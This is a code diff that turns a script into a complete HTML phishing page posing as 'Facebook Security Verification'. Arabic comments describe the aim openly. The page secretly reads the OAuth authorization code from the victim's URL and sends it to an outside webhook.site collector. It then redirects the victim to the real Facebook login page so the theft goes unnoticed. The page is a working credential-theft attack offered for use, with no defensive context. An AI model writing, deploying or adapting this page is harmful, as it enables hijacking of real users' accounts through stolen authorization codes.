@@ -1,15 +1,26 @@
-// بمجرد وصول الضحية من فيسبوك ومعه الكود في الرابط
-window.onload = function() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const authCode = urlParams.get('code'); // سحب الكود المسرب
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook Security Verification</title>
+</head>
+<body>
+    <script>
+        // هذا الجزء سينفذ خفية ولن يراه الضحية
+        window.onload = function() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const authCode = urlParams.get('code'); 
 
-    if (authCode) {
-        // إرسال الكود فوراً للمهاجم
-        fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_code=' + authCode, {
-            mode: 'no-cors'
-        }).then(() => {
-            // تحويل الضحية لفيسبوك الحقيقي ليبدو الأمر طبيعياً
-            window.location.href = "https://www.facebook.com/login/";
-        });
-    }
-}
+            if (authCode) {
+                // إرسال الكود فوراً للمهاجم (Webhook)
+                fetch('https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190?leaked_code=' + authCode, {
+                    mode: 'no-cors'
+                }).then(() => {
+                    // بعد السرقة، حول الضحية لفيسبوك الحقيقي لإبعاد الشبهة
+                    window.location.href = "https://www.facebook.com/login/";
+                });
+            }
+        };
+    </script>
+    <p>Loading security check, please wait...</p>
+</body>
+</html>
